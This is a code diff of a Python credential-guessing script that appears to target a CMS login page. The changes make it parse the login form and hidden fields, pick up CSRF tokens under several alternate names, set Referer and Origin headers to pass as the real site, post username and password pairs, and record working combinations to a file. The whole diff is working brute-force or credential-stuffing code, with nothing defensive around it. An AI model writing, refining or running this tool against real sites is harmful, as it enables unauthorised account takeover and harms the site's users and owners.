@@ -1,14 +1,16 @@
 import time
 import requests
-from typing import Optional, Set
 from bs4 import BeautifulSoup
+from urllib.parse import urljoin
+from typing import Optional, Set, Tuple, Dict
 from utils.files_read_write_utils import save_to_file
 from settings import (
-    LOGIN_PAGE,
-    LOGIN_POST,
+    LOGIN_PAGE_URL,
+    LOGIN_POST_URL,
+    DEFAULT_SESSION_HEADERS,
     SUCCESS_FILE_PATH,
+    USERNAME_PARAM_STRING,
     PASSWORD_PARAM_STRING,
-    LOGIN_PARAM_STRING,
     CSRF_PARAM_STRING,
     DELAY_BETWEEN_REQUESTS,
 )
@@ -16,22 +18,16 @@ from settings import (
 
 def create_session() -> Optional[requests.Session]:
     """
-    Creates a new HTTP session and checks server availability.
+    Create a requests.Session with default headers and verify the login page is reachable.
 
     Returns:
         Optional[requests.Session]: A configured session if the server is reachable,
-                                    None otherwise.
+        None otherwise.
     """
     session = requests.Session()
-    session.headers.update(
-        {
-            "User-Agent": "Mozilla/5.0",
-            "Accept": "application/json, text/javascript, */*; q=0.01",
-            "X-Requested-With": "XMLHttpRequest",
-        }
-    )
+    session.headers.update(DEFAULT_SESSION_HEADERS)
     try:
-        r = session.get(LOGIN_PAGE, timeout=10)
+        r = session.get(LOGIN_PAGE_URL, timeout=10)
         if r.status_code != 200:
             print(f"[!] Server returned status: {r.status_code}")
             return None
@@ -41,50 +37,87 @@ def create_session() -> Optional[requests.Session]:
     return session
 
 
-def get_csrf_token(session: requests.Session) -> Optional[str]:
+def fetch_login_form(session: requests.Session) -> Tuple[str, Dict[str, str]]:
     """
-    Retrieves the CSRF token from the login page.
+    Fetch the login page and parse form details, including hidden inputs.
 
     Args:
-        session (requests.Session): The active HTTP session.
+        session (requests.Session): Active HTTP session.
 
     Returns:
-        Optional[str]: The CSRF token if found, None otherwise.
+        Tuple[str, Dict[str, str]]:
+            - post_url (str): Absolute URL to send the POST request to.
+            - form_values (dict): Hidden/default form inputs like 'redirect' or CSRF tokens.
     """
-    try:
-        r = session.get(LOGIN_PAGE)
-        soup = BeautifulSoup(r.text, "html.parser")
-        token_input = soup.find("input", {"name": "csrf_token"})
-        if token_input:
-            token = token_input.get("value")
-            print(f"[DEBUG] CSRF token: {token}")
-            return token
-    except Exception as e:
-        print(f"[!] Error retrieving CSRF token: {e}")
-    return None
+    r = session.get(LOGIN_PAGE_URL, timeout=10)
+    soup = BeautifulSoup(r.text, "html.parser")
+    form = soup.find("form")
+
+    post_action = form.get("action") if form and form.get("action") else None
+    post_url = urljoin(LOGIN_PAGE_URL, post_action) if post_action else LOGIN_POST_URL
+
+    form_values: Dict[str, str] = {}
+    if form:
+        for inp in form.find_all("input"):
+            name = inp.get("name")
+            val = inp.get("value", "")
+            if name:
+                form_values[name] = val
+
+    return post_url, form_values
 
 
 def try_login(
     session: requests.Session, known_success: Set[str], username: str, password: str
 ) -> bool:
-    """Attempt to log in with given credentials.
+    """
+    Attempt to log in using a username and password.
+
+    This function:
+        - Fetches the login form to extract action URL and hidden inputs.
+        - Builds a POST payload with username, password, optional redirect and CSRF token.
+        - Updates session headers with Referer and Origin.
+        - Sends a POST request and interprets JSON response.
+        - Saves successful credentials to file and known_success set.
 
     Args:
         session (requests.Session): Active HTTP session.
-        known_success (Set[str]): Set of successful username:password combos.
+        known_success (Set[str]): Set of already successful username:password combos.
         username (str): Username to try.
         password (str): Password to try.
 
     Returns:
-        bool: True if login successful, False otherwise.
+        bool: True if login is successful, False otherwise.
     """
-    data = {LOGIN_PARAM_STRING: username, PASSWORD_PARAM_STRING: password}
-    csrf_token = get_csrf_token(session)
-    if csrf_token:
-        data[CSRF_PARAM_STRING] = csrf_token
+    post_url, form_values = fetch_login_form(session)
+
+    payload = {
+        USERNAME_PARAM_STRING: username,
+        PASSWORD_PARAM_STRING: password,
+    }
+
+    payload["redirect"] = form_values.get("redirect", "/apps/tncms/login.cms")
+
+    csrf_val = form_values.get(CSRF_PARAM_STRING)
+    if not csrf_val:
+        for alt in ("csrf_token", "_csrf", "token"):
+            if alt in form_values:
+                csrf_val = form_values[alt]
+                break
+    if csrf_val:
+        payload[CSRF_PARAM_STRING] = csrf_val
+
+    session.headers.update(
+        {
+            "Referer": LOGIN_PAGE_URL,
+            "Origin": "{scheme}://{host}".format(
+                scheme="https", host=LOGIN_PAGE_URL.split("://")[1].split("/")[0]
+            ),
+        }
+    )
 
     try:
-        resp = session.post(LOGIN_POST, data=data)
+        resp = session.post(post_url, data=payload, timeout=15)
         time.sleep(DELAY_BETWEEN_REQUESTS)
 
         if resp.status_code != 200:
@@ -105,7 +138,9 @@ def try_login(
             print(f"[+] Success: {combo}")
             return True
 
-        print(f"[-] Failed: {username}:{password}")
+    except requests.RequestException as e:
+        print(f"[!] Request error for {username}:{password} -> {e}")
     except Exception as e:
-        print(f"[!] Response error for {username}:{password} -> {e}")
+        print(f"[!] Unexpected error for {username}:{password} -> {e}")
+
     return False
